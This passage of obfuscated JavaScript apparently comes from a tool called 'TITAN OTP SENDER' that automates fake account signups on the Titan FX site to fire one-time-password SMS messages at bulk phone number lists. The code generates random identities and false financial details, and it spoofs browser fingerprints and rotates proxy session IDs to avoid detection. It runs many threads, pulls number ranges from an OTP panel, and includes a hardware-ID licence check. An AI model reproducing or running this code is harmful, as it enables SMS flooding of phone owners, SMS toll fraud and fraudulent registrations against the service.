    opts104.clientHints['sec-ch-ua-platform-version'] = _Na;
    opts104.clientHints['sec-ch-ua-full-version-list'] = '"Chromium";v="' + _ua + '.0.' + _xa + '.' + _ya + '", ' + _Aa + ', "Microsoft Edge";v="' + _ua + '.0.' + _xa + '.' + _Ma + '"';
    return opts104;
  }
  if (_Ca === 'mac') {
    const _Oa = arr14[Math.floor(Math.random() * arr14.length)], opts105 = {};
    opts105.name = _Oa.silicon ? 'Mac Chrome (ARM)' : 'Mac Chrome (Intel)';
    opts105.userAgent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X ' + _Oa.ua + ') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + _ua + '.0.' + _xa + '.' + _ya + ' Safari/537.36';
    opts105.clientHints = {};
    opts105.clientHints['sec-ch-ua'] = '"Google Chrome";v="' + _ua + '", "Chromium";v="' + _ua + '", ' + _Aa;
    opts105.clientHints['sec-ch-ua-mobile'] = '?0';
    opts105.clientHints['sec-ch-ua-platform'] = '"macOS"';
    opts105.clientHints['sec-ch-ua-platform-version'] = _Oa.platform;
    opts105.clientHints['sec-ch-ua-full-version-list'] = '"Google Chrome";v="' + _ua + '.0.' + _xa + '.' + _ya + '", "Chromium";v="' + _ua + '.0.' + _xa + '.' + _ya + '", ' + _Aa;
    return opts105;
  } else {
    if (_Ca === 'linux') {
      return {
        'name': 'Linux Chrome',
        'userAgent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + _ua + '.0.' + _xa + '.' + _ya + ' Safari/537.36',
        'clientHints': {
          'sec-ch-ua': '"Google Chrome";v="' + _ua + '", "Chromium";v="' + _ua + '", ' + _Aa,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Linux"',
          'sec-ch-ua-platform-version': '"6.' + (Math.floor(Math.random() * 8) + 1) + '.' + Math.floor(Math.random() * 20) + '"',
          'sec-ch-ua-full-version-list': '"Google Chrome";v="' + _ua + '.0.' + _xa + '.' + _ya + '", "Chromium";v="' + _ua + '.0.' + _xa + '.' + _ya + '", ' + _Aa
        }
      };
    } else {
      const _Pa = _Da(_Ca === 'win11' ? arr12 : arr13);
      return {
        'name': _Ca === 'win11' ? 'Win11 Chrome' : 'Win10 Chrome',
        'userAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + _ua + '.0.' + _xa + '.' + _ya + ' Safari/537.36',
        'clientHints': {
          'sec-ch-ua': '"Google Chrome";v="' + _ua + '", "Chromium";v="' + _ua + '", ' + _Aa,
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'sec-ch-ua-platform-version': _Pa,
          'sec-ch-ua-full-version-list': '"Google Chrome";v="' + _ua + '.0.' + _xa + '.' + _ya + '", "Chromium";v="' + _ua + '.0.' + _xa + '.' + _ya + '", ' + _Aa
        }
      };
    }
  }
}
function parseProxy(_Qa) {
  if (!_Qa)
    return null;
  if (typeof _Qa === 'object')
    return _Qa;
  _Qa = _Qa.trim();
  if (!_Qa)
    return null;
  let _Ra, _Sa, _Ta, _Ua;
  if (_Qa.includes('://'))
    _Qa = _Qa.split('://')[1];
  if (_Qa.includes('@')) {
    const parts2 = _Qa.split('@'), parts3 = parts2[0].split(':'), parts4 = parts2[1].split(':');
    _Ta = parts3[0];
    _Ua = parts3[1];
    _Ra = parts4[0];
    _Sa = parseInt(parts4[1]);
  } else {
    const parts5 = _Qa.split(':');
    if (parts5.length === 2)
      _Ra = parts5[0], _Sa = parseInt(parts5[1]);
    else {
      if (parts5.length === 4) {
        if (!isNaN(parseInt(parts5[3])) && isNaN(parseInt(parts5[1]))) {
          _Ta = parts5[0];
          _Ua = parts5[1];
          _Ra = parts5[2];
          _Sa = parseInt(parts5[3]);
        } else
          _Ra = parts5[0], _Sa = parseInt(parts5[1]), _Ta = parts5[2], _Ua = parts5[3];
      } else
        parts5.length === 3 && (_Ra = parts5[0], _Sa = parseInt(parts5[1]), _Ta = parts5[2]);
    }
  }
  if (!_Ra || !_Sa)
    return null;
  const opts106 = {};
  opts106.type = 'http';
  opts106.host = _Ra;
  opts106.port = _Sa;
  opts106.user = _Ta;
  opts106.pass = _Ua;
  opts106.original = _Qa;
  return opts106;
}
function rotateSessionId(_Va) {
  if (!_Va || !_Va.user)
    return _Va;
  const opts107 = { ..._Va };
  const _Wa = opts107;
  if (_Wa.user.includes('-ssid-')) {
    const _Xa = crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 10);
    _Wa.user = _Wa.user.replace(/-ssid-[A-Za-z0-9_]+/, '-ssid-' + _Xa);
  } else {
    if (_Wa.user.includes('-session-')) {
      const _Ya = crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 10);
      _Wa.user = _Wa.user.replace(/-session-[A-Za-z0-9_]+/, '-session-' + _Ya);
    } else {
      if (/_sid_/i.test(_Wa.user)) {
        const _Za = crypto.randomBytes(6).toString('base64').replace(/[+/=]/g, '').substring(0, 10);
        _Wa.user = _Wa.user.replace(/_sid_[A-Za-z0-9]+/i, '_sid_' + _Za);
      }
    }
  }
  return _Wa;
}
function createProxyAgent(_ab) {
  if (!_ab)
    return null;
  const _bb = typeof _ab === 'string' ? parseProxy(_ab) : _ab;
  if (!_bb)
    return null;
  let _cb = '';
  return _bb.type === 'socks5' || _bb.type === 'socks4' ? (_cb = 'socks5://' + (_bb.user ? encodeURIComponent(_bb.user) + ':' + encodeURIComponent(_bb.pass || '') + '@' : '') + _bb.host + ':' + _bb.port, new SocksProxyAgent(_cb)) : (_cb = 'http://' + (_bb.user ? encodeURIComponent(_bb.user) + ':' + encodeURIComponent(_bb.pass || '') + '@' : '') + _bb.host + ':' + _bb.port, new HttpsProxyAgent(_cb));
}
function sendRequest(_db, _eb, _fb, _gb, _hb = null, _ib = 15000, _jb = {}) {
  return new Promise((resolve4, reject3) => {
    const uRL = new URL(_db), opts108 = { ..._fb };
    let _kb = opts108;
    !_kb['Accept-Encoding'] && (_kb['Accept-Encoding'] = 'gzip, deflate, br');
    _gb && (_kb['Content-Length'] = Buffer.byteLength(_gb));
    const opts109 = {
      'hostname': uRL.hostname,
      'path': uRL.pathname + uRL.search,
      'method': _eb,
      'headers': _kb,
      'timeout': _ib,
      'ciphers': 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
      'secureOptions': require('crypto').constants.SSL_OP_NO_SSLv3 | require('crypto').constants.SSL_OP_NO_TLSv1 | require('crypto').constants.SSL_OP_NO_TLSv1_1
    };
    let _lb = null;
    if (_hb) {
      _lb = typeof _hb === 'object' ? _hb : parseProxy(_hb);
      if (!_lb || isNaN(_lb.port) || _lb.port <= 0)
        return reject3(new Error('FATAL: Invalid proxy. Aborting to prevent IP leak.'));
      opts109.agent = createProxyAgent(_lb);
    }
    const _mb = https.request(opts109, _nb => {
      const arr17 = [];
      let _ob = 0;
      const _pb = _jb.maxBytes || 0;
      let _qb = false;
      _nb.on('data', _rb => {
        if (!_qb) {
          arr17.push(_rb);
          _ob += _rb.length;
          if (_pb > 0 && _ob >= _pb) {
            _qb = true;
          }
        }
      });
      _nb.on('error', _sb => {
        if (_qb)
          return _tb();
        reject3(_sb);
      });
      const _tb = () => {
        let _ub = Buffer.concat(arr17);
        const _vb = _nb.headers['content-encoding'];
        if (_vb === 'gzip')
          try {
            _ub = zlib.gunzipSync(_ub);
          } catch (err7) {
          }
        else {
          if (_vb === 'deflate') {
            try {
              _ub = zlib.inflateSync(_ub);
            } catch (err8) {
            }
          } else {
            if (_vb === 'br') {
              try {
                _ub = zlib.brotliDecompressSync(_ub);
              } catch (err9) {
              }
            }
          }
        }
        const _wb = _nb.headers['set-cookie'] || [];
        resolve4({
          'status': _nb.statusCode,
          'data': _ub.toString('utf8'),
          'headers': _nb.headers,
          'cookies': _wb
        });
      };
      _nb.on('end', _tb);
    });
    _mb.on('error', reject3);
    _mb.on('timeout', () => {
      _mb.destroy();
      reject3(new Error('timeout'));
    });
    if (_gb)
      _mb.write(_gb);
    _mb.end();
  });
}
async function triggerOTP(_xb, _yb = {}) {
  const {
    onStatus: onStatus = () => {
    },
    proxy: proxy = null,
    timeout: timeout = 15000,
    workerId: workerId = 0,
    browserPref: browserPref = 'random'
  } = _yb;
  const _zb = normalizePhoneNumber(_xb), _Ab = detectCountryFromPhone(_zb), _Bb = _Ab.code;
  try {
    const _Cb = getRandomClient(browserPref), _Db = generateRandomEmail(), _Eb = generateRandomPassword(), _Fb = generateRandomNickname(), _Gb = generateRandomName(), _Hb = generateRandomDOB(), _Ib = generateRandomAddress(_Bb), opts110 = {};
    opts110.NEXT_LOCALE = 'en-au';
    let _Jb = opts110;
    const _Kb = _Lb => {
        if (!_Lb)
          return;
        _Lb.forEach(item3 => {
          const parts6 = item3.split(';')[0].split('=');
          if (parts6.length >= 2)
            _Jb[parts6[0].trim()] = parts6.slice(1).join('=').trim();
        });
      }, _Mb = () => Object.entries(_Jb).map(([_Nb, _Ob]) => _Nb + '=' + _Ob).join('; '), _Pb = (_Qb, _Rb, _Sb) => ({
        'User-Agent': _Cb.userAgent,
        'Accept': 'text/x-component',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'text/plain;charset=UTF-8',
        'Origin': 'https://secure.titanfx.com',
        'Referer': _Sb,
        'next-action': _Qb,
        'next-router-state-tree': _Rb,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Cookie': _Mb(),
        ..._Cb.clientHints
      });
    onStatus('[1/5] Signup \u2192 ' + _Ab.name + ' (' + _Bb + ') | ' + _Db.substring(0, 15) + '...');
    const opts111 = {};
    opts111.email = _Db;
    opts111.password = _Eb;
    opts111.country = _Bb;
    const opts112 = {};
    opts112.fileName = 'SignupForm.tsx';
    opts112.page = 'sign-up page';
    const _Tb = JSON.stringify([
        opts111,
        opts112
      ]), _Ub = _Pb('7fc4f75e8afa1553b3a01588244ed27d9d785db1ad', '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lng%22%2C%22en-au%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(split)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22step%22%2C%7B%22children%22%3A%5B%22signup%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D', 'https://secure.titanfx.com/register/step/signup'), opts113 = {};
    opts113.email = _Db;
    opts113.password = _Eb;
    opts113.country = _Bb;
    debugLog(_zb, 'step1-req', opts113);
    const opts114 = {};
    opts114.maxBytes = 2048;
    const _Vb = await sendRequest('https://secure.titanfx.com/register/step/signup', 'POST', _Ub, _Tb, proxy, timeout, opts114);
    _Kb(_Vb.cookies);
    debugLog(_zb, 'step1-res', {
      'status': _Vb.status,
      'data': _Vb.data.substring(0, 500)
    });
    if (_Vb.status !== 200) {
      throw new Error('Signup failed (HTTP ' + _Vb.status + ')');
    }
    if (_Vb.data.toLowerCase().includes('error') && _Vb.data.toLowerCase().includes('already'))
      throw new Error('Email already registered');
    onStatus('[2/5] Initializing account setup session...');
    const _Wb = _Pb('7f2be3ccd44c6ecfc9261c09a3ffdab61d3ec55d44', '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lng%22%2C%22en-au%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(nosidebar)%22%2C%7B%22children%22%3A%5B%22(unauthenticated)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22step%22%2C%7B%22children%22%3A%5B%22account-setup%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D', 'https://secure.titanfx.com/register/step/account-setup'), opts115 = {};
    opts115.maxBytes = 512;
    const _Xb = await sendRequest('https://secure.titanfx.com/register/step/account-setup', 'POST', _Wb, '[]', proxy, timeout, opts115);
    _Kb(_Xb.cookies);
    const opts116 = {};
    opts116.status = _Xb.status;
    opts116.cookies = _Xb.cookies;
    debugLog(_zb, 'step2a-res', opts116);
    if (!_Jb._fb_img) {
      debugLog(_zb, 'warning', '_fb_img cookie not set after preflight');
    }
    onStatus('[3/5] Submitting trading account details...');
    const opts117 = {};
    opts117.email = _Db;
    opts117.nickname = _Fb;
    opts117.serverType = 'mt4';
    opts117.tradingAccountGroupType = 'blade';
    opts117.leverage = '50';
    opts117.currency = 'JPY';
    const _Yb = JSON.stringify([opts117]), _Zb = _Pb('7f9bc1e3222ec211a25834ceeca378199c4e723e6e', '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lng%22%2C%22en-au%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(nosidebar)%22%2C%7B%22children%22%3A%5B%22(unauthenticated)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22step%22%2C%7B%22children%22%3A%5B%22account-setup%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D', 'https://secure.titanfx.com/register/step/account-setup');
    debugLog(_zb, 'step2b-req', _Yb);
    const opts118 = {};
    opts118.maxBytes = 2048;
    const _ac = await sendRequest('https://secure.titanfx.com/register/step/account-setup', 'POST', _Zb, _Yb, proxy, timeout, opts118);
    _Kb(_ac.cookies);
    debugLog(_zb, 'step2b-res', {
      'status': _ac.status,
      'data': _ac.data.substring(0, 500)
    });
    if (_ac.status !== 200) {
      throw new Error('Account setup failed (HTTP ' + _ac.status + ')');
    }
    onStatus('[4/5] Initializing personal info form...');
    const _bc = _Pb('7fdc1dc82e72899590833a184838e5fcf117cee68c', '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lng%22%2C%22en-au%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(nosidebar)%22%2C%7B%22children%22%3A%5B%22(unauthenticated)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22step%22%2C%7B%22children%22%3A%5B%22personal-info%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D', 'https://secure.titanfx.com/register/step/personal-info'), opts119 = {};
    opts119.maxBytes = 512;
    const _cc = await sendRequest('https://secure.titanfx.com/register/step/personal-info', 'POST', _bc, '[]', proxy, timeout, opts119);
    _Kb(_cc.cookies);
    const opts120 = {};
    opts120.status = _cc.status;
    debugLog(_zb, 'step3a-res', opts120);
    onStatus('[5/5] Submitting phone number \u2192 Triggering OTP...');
    const opts121 = {};
    opts121.phone = _zb;
    opts121.language = 'en';
    const opts122 = {};
    opts122.firstName = _Gb.first;
    opts122.lastName = _Gb.last;
    opts122.dateOfBirth = _Hb.full;
    opts122.nationality = _Bb;
    opts122.countryOfResidence = _Bb;
    opts122.address = _Ib.street;
    opts122.city = _Ib.city;
    opts122.state = _Ib.state;
    opts122.postalCode = _Ib.postalCode;
    opts122.employmentStatus = 'Employed';
    opts122.industry = 'Finance And Insurance';
    opts122.annualIncome = '50001-100000';
    opts122.netWorth = '100001-500000';
    opts122.sourceOfFunds = 'Employment Income';
    opts122.expectedDeposit = '1001-5000';
    opts122.purposeOfTrading = 'Speculation / Active Trading';
    opts122.forexExperience = '1-3 years';
    opts122.cfdExperience = 'Less than 1 year';
    opts122.stocksExperience = 'Less than 1 year';
    opts122.usCitizen = false;
    opts122.politicallyExposed = false;
    opts122.termsAccepted = true;
    opts122.privacyAccepted = true;
    opts122.fileName = 'PersonalInfoForm.tsx';
    opts122.page = 'personal-info page';
    const _dc = JSON.stringify([
        opts121,
        opts122
      ]), _ec = _Pb('7f6a2e1f01a78f3233af65ab5cd7156a4b2930e04a', '%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lng%22%2C%22en-au%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22(nosidebar)%22%2C%7B%22children%22%3A%5B%22(unauthenticated)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22step%22%2C%7B%22children%22%3A%5B%22personal-info%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D', 'https://secure.titanfx.com/register/step/personal-info');
    debugLog(_zb, 'step3b-req', _dc);
    const opts123 = {};
    opts123.maxBytes = 2048;
    const _fc = await sendRequest('https://secure.titanfx.com/register/step/personal-info', 'POST', _ec, _dc, proxy, timeout, opts123);
    _Kb(_fc.cookies);
    debugLog(_zb, 'step3b-res', {
      'status': _fc.status,
      'data': _fc.data.substring(0, 500)
    });
    if (_fc.status === 200) {
      const _gc = _fc.data.toLowerCase();
      if (_gc.includes('error') && (_gc.includes('invalid') || _gc.includes('failed')))
        throw new Error('Server returned error in personal info submission');
      onStatus('[5/5] \u2705 OTP Triggered Successfully');
      const opts124 = {};
      opts124.success = true;
      opts124.message = 'OTP Triggered via Titan FX registration';
      opts124.phone = _zb;
      opts124.email = _Db;
      opts124.browser = _Cb.name;
      return opts124;
    } else {
      throw new Error('Personal info submission failed (HTTP ' + _fc.status + ')');
    }
  } catch (err10) {
    const opts125 = {};
    opts125.success = false;
    opts125.message = '' + err10.message;
    opts125.phone = _zb;
    return opts125;
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(_hc) {
      const parts7 = '1|3|0|4|2'.split('|');
      let _ic = 0;
      while (true) {
        switch (parts7[_ic++]) {
        case '0':
          this.successful = 0;
          continue;
        case '1':
          this.totalNumbers = _hc;
          continue;
        case '2':
          this.startTime = Date.now();
          continue;
        case '3':
          this.processed = 0;
          continue;
        case '4':
          this.failed = 0;
          continue;
        }
        break;
      }
    }
    addLog(_jc, _kc) {
      let _lc = '';
      const match = _jc.match(/\+?\d{8,}/), _mc = match ? match[0] : '';
      if (_kc === 'success')
        _lc = chalk.hex('#00FF88')('SK \u2014 Titan \u2502 OTP Sent \u2192 ') + chalk.hex('#00BFFF').bold(_mc || _jc);
      else {
        if (_kc === 'error' || _kc === 'failed') {
          let _nc = _jc.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
          if (_nc.toLowerCase().includes('proxy'))
            _lc = chalk.hex('#FF4466')('SK \u2014 Titan \u2502 Proxy Drop \u2192 ') + chalk.hex('#888888')(_nc);
          else {
            _lc = chalk.hex('#FF4466')('SK \u2014 Titan \u2502 Failed \u2192 ') + chalk.hex('#00BFFF').bold(_mc) + chalk.hex('#888888')(' (' + _nc + ')');
          }
        } else
          return;
      }
      process.stdout.write('\r\x1B[K' + _lc + '\n');
      this.render();
    }
    setStatus(_oc) {
    }
    update() {
    }
    render() {
      const _pc = this.processed / Math.max(this.totalNumbers, 1);
      const _qc = (_pc * 100).toFixed(1), _rc = 20, _sc = Math.round(_pc * _rc), _tc = _rc - _sc, _uc = chalk.hex('#00FF88')('\u2588'.repeat(_sc)) + chalk.hex('#333333')('\u2591'.repeat(_tc));
      const _vc = '  ' + chalk.hex('#0066FF').bold('AIZENTOOLS') + chalk.hex('#555555')(' \u2B9E ') + _uc + chalk.hex('#888888')(' ' + _qc + '%') + chalk.hex('#555555')('  \u2502  ') + chalk.hex('#00FF88').bold('\u2713 ' + this.successful) + chalk.hex('#555555')('  ') + chalk.hex('#FF4466').bold('\u2717 ' + this.failed) + chalk.hex('#555555')('  [' + this.processed + '/' + this.totalNumbers + ']');
      process.stdout.write('\r\x1B[K' + _vc);
    }
    stop() {
      process.stdout.write('\x1B[2K\r\n');
      const _wc = Math.floor((Date.now() - this.startTime) / 1000);
      const _xc = Math.floor(_wc / 60), _yc = _wc % 60, _zc = _xc + 'm ' + _yc + 's';
      console.log(C('  \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557'));
      console.log(C('  \u2551') + W.bold('  TITAN OTP SENDER \u2014 COMPLETE               ') + C('\u2551'));
      console.log(C('  \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563'));
      console.log(C('  \u2551') + ('  ' + chalk.greenBright('Successful') + '   ' + chalk.greenBright(String(this.successful).padStart(6)) + '                       ') + C('\u2551'));
      console.log(C('  \u2551') + ('  ' + chalk.red('Failed') + '       ' + chalk.red(String(this.failed).padStart(6)) + '                       ') + C('\u2551'));
      console.log(C('  \u2551') + ('  ' + chalk.cyan('Total Time') + '   ' + chalk.cyan(_zc.padEnd(6)) + '                       ') + C('\u2551'));
      console.log(C('  \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\n'));
    }
  }
  async function selectOption(_Ac, _Bc) {
    return new Promise(resolve5 => {
      let _Cc = 0;
      process.stdin.resume();
      readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY)
        process.stdin.setRawMode(true);
      const _Dc = () => {
        process.stdout.write('\x1B[2J\x1B[H');
        printHeader();
        console.log('   \x1B[33m' + _Ac + '\x1B[0m\n');
        _Bc.forEach((item4, index2) => {
          index2 === _Cc ? console.log('   \x1B[36m\u2794\x1B[35m ' + item4.name + '\x1B[0m') : console.log('     \x1B[90m' + item4.name + '\x1B[0m');
        });
      };
      _Dc();
      const _Ec = (_Fc, _Gc) => {
        if (_Gc.ctrl && _Gc.name === 'c')
          process.exit(0);
        if (_Gc.name === 'up') {
          _Cc = (_Cc - 1 + _Bc.length) % _Bc.length;
          _Dc();
        } else {
          if (_Gc.name === 'down')
            _Cc = (_Cc + 1) % _Bc.length, _Dc();
          else
            _Gc.name === 'return' && (process.stdin.setRawMode(false), process.stdin.removeListener('keypress', _Ec), resolve5(_Bc[_Cc].value));
        }
      };
      process.stdin.on('keypress', _Ec);
    });
  }
  async function promptText(_Hc, _Ic) {
    return new Promise(resolve6 => {
      process.stdout.write('   \x1B[33m' + _Hc + '\x1B[0m ');
      let _Jc = '';
      if (process.stdin.isTTY)
        process.stdin.setRawMode(false);
      process.stdin.resume();
      const _Kc = _Lc => {
        const _Mc = _Lc.toString();
        if (_Mc.includes('\n') || _Mc.includes('\r')) {
          process.stdin.removeListener('data', _Kc);
          _Jc += _Mc.split(/[\r\n]/)[0];
          let _Nc = _Jc.trim();
          if (_Nc.startsWith('"') && _Nc.endsWith('"'))
            _Nc = _Nc.slice(1, -1);
          resolve6(_Nc || _Ic);
        } else
          _Jc += _Mc;
      };
      process.stdin.on('data', _Kc);
    });
  }
  async function interactiveWizard() {
    process.stdout.write('\x1B[2J\x1B[H');
    printHeader();
    console.log(W.bold('  --- TITAN OTP SENDER ---\n'));
    const _Oc = await selectOption('SELECT NUMBER SOURCE', [
      {
        'name': '\uD83D\uDCC1 Load from file (numbers.txt)',
        'value': 'file'
      },
      {
        'name': '\uD83C\uDF10 Auto fetch from NexaOTP Panel',
        'value': 'nexa'
      }
    ]);
    let _Pc = 'numbers.txt', _Qc = null;
    if (_Oc === 'nexa') {
      let _Rc = '';
      const _Sc = path.join(__dirname, '.nexa_api_key');
      if (fs.existsSync(_Sc)) {
        const _Tc = fs.readFileSync(_Sc, 'utf8').trim(), _Uc = await selectOption('Found saved API Key (...' + _Tc.slice(-4) + '). Use it?', [
            {
              'name': 'Yes, use saved key',
              'value': 'yes'
            },
            {
              'name': 'No, enter new key',
              'value': 'no'
            },
            {
              'name': 'Delete saved key',
              'value': 'delete'
            }
          ]);
        if (_Uc === 'yes') {
          _Rc = _Tc;
        } else {
          if (_Uc === 'delete') {
            fs.unlinkSync(_Sc);
            console.log(G('\n   \u2717 Saved key deleted.\n'));
          }
        }
      }
      if (!_Rc) {
        _Rc = await promptText('Enter NexaOTP API Key:', '');
        const opts126 = {};
        opts126.name = 'No';
        opts126.value = 'no';
        const _Vc = await selectOption('Save this key for future use?', [
          {
            'name': 'Yes, save it',
            'value': 'yes'
          },
          opts126
        ]);
        _Vc === 'yes' && (fs.writeFileSync(_Sc, _Rc, 'utf8'), console.log(G('\n   \u2713 API key saved.\n')));
      }
      let arr18 = [], _Wc = true;
      while (_Wc) {
        const _Xc = await promptText('Enter range #' + (arr18.length + 1) + ' (e.g. 21624485XXX):', '');
        if (_Xc)
          arr18.push(_Xc);
        const _Yc = await selectOption('Add another range?', [
          {
            'name': 'Yes',
            'value': 'yes'
          },
          {
            'name': 'No, proceed',
            'value': 'no'
          }
        ]);
        if (_Yc === 'no')
          _Wc = false;
      }
      arr18.length === 0 && (console.log(R('\n   \u2717 You must provide at least one range.\n')), process.exit(1));
      const _Zc = await promptText('How many numbers to process? (e.g. 100):', '50'), _ad = parseInt(_Zc) || 50, _bd = await selectOption('SELECT NEXA SERVER', [
          {
            'name': 'Server 1 (/get)',
            'value': '/api/v1/numbers/get'
          },
          {
            'name': 'Server 2 (/p2/get)',
            'value': '/api/v1/numbers/p2/get'
          },
          {
            'name': 'Server 3 (/p3/get)',
            'value': '/api/v1/numbers/p3/get'
          }
        ]), opts127 = {};
      opts127.apiKey = _Rc;
      opts127.ranges = arr18;
      opts127.totalCount = _ad;
      opts127.serverEndpoint = _bd;
      _Qc = opts127;
    } else {
      _Pc = await promptText('Enter Phone Numbers File Path [default: numbers.txt]:', 'numbers.txt');
      if (!fs.existsSync(_Pc))
        fs.writeFileSync(_Pc, '');
    }
    let _cd = await promptText('Enter Proxies File Path (Leave blank for direct) [default: none]:', 'none');
    if (_cd === 'none' || _cd === '')
      _cd = '';
    const _dd = await selectOption('SELECT THREADS', [
        {
          'name': '5 Threads (Safe)',
          'value': 5
        },
        {
          'name': '10 Threads (Default)',
          'value': 10
        },
        {
          'name': '20 Threads (Fast)',
          'value': 20
        },
        {
          'name': '50 Threads (Extreme)',
          'value': 50
        }
      ]), _ed = await selectOption('SELECT BROWSER PROFILE', [
        {
          'name': '\uD83C\uDFB2 Random Mix',
          'value': 'random'
        },
        {
          'name': '\uD83C\uDF10 Google Chrome',
          'value': 'chrome'
        },
        {
          'name': '\uD83E\uDD8A Mozilla Firefox',
          'value': 'firefox'
        },
        {
          'name': '\uD83C\uDF0A Microsoft Edge',
          'value': 'edge'
        }
      ]);
    process.stdin.pause();
    return {
      'numbersFile': _Pc,
      'threads': String(_dd),
      'proxiesFile': _cd,
      'browser': _ed,
      'nexaConfig': _Qc
    };
  }
  function generateHWID() {
    const _fd = require('os');
    const _gd = _fd.platform();
    try {
      if (_gd === 'win32') {
        const _hd = execSync('powershell -NoProfile -Command "' + '$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; ' + '$cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; ' + '$disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; ' + '$mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; ' + 'Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
          'stdio': 'pipe',
          'timeout': 15000
        }).toString().trim();
        if (!_hd)
          throw new Error('No hardware data');
        const _id = crypto.createHash('sha256').update(_hd).digest('hex').toUpperCase();
        return 'IZENHSX-7BA3FB09-723F-A500';
      } else {
        let arr19 = [];
        try {
          const _jd = execSync('settings get secure android_id 2>/dev/null || echo ""', {
            'stdio': 'pipe',
            'timeout': 5000
          }).toString().trim();
          if (_jd && _jd !== 'null')
            arr19.push('A:' + _jd);
        } catch (err11) {
        }
        try {
